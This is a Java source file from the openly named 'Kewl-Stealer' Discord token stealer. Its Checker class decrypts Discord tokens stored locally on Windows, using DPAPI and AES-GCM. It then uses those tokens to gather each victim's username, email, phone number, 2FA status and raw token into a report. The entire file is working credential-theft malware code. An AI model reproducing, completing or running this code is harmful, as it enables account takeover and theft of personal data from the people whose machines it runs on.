package Kewl.Stealer.payload.payloads.discord;

import com.sun.jna.platform.win32.Crypt32Util;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

public class Checker {
    public static String osKey = null;

    public String checkUser(String token) {
        JSONObject response = new JSONObject(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me", token));
        String info = "===User Info===\n\n\n";
        String username = String.format("%s#%s", response.getString("username"), response.getString("discriminator"));
        String bio = response.getString("bio");
        String email = response.getString("email");
        Boolean twofa = response.getBoolean("mfa_enabled");
        Boolean verified = response.getBoolean("verified");
        info = info + "Username: " + username;
        info = info + "\nBio: " + bio;
        info = info + "\nEmail: " + email;
        String credit = "===https://github.com/kewlsquad/Kewl-Stealer===\n\n\n";

        try {
            info = info + "\nPhone: " + response.getString("phone");
        } catch (Exception var10) {
        }

        return String.format(info + "\n2FA: %b\nVerified: %b\n\nToken: %s\nThanks Kewl %s", twofa, verified, token, credit);
    }

    public static String decryptToken(String token) throws Exception {
        byte[] z = Base64.getDecoder().decode(osKey);
        byte[] y = Arrays.copyOfRange(z, 5, z.length);
        byte[] finalKey = Crypt32Util.cryptUnprotectData(y);
        byte[] finaltoken = new byte[12];
        byte[] tok = Base64.getDecoder().decode(token.split("dQw4w9WgXcQ:")[1]);

        for(int i = 0; i < 12; ++i) {
            finaltoken[i] = tok[i + 3];
        }

        byte[] data = new byte[tok.length - 15];

        for(int i = 0; i < data.length; ++i) {
            data[i] = tok[i + 15];
        }

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(2, new SecretKeySpec(finalKey, "AES"), new GCMParameterSpec(128, finaltoken));
        return new String(cipher.doFinal(data));
    }
}
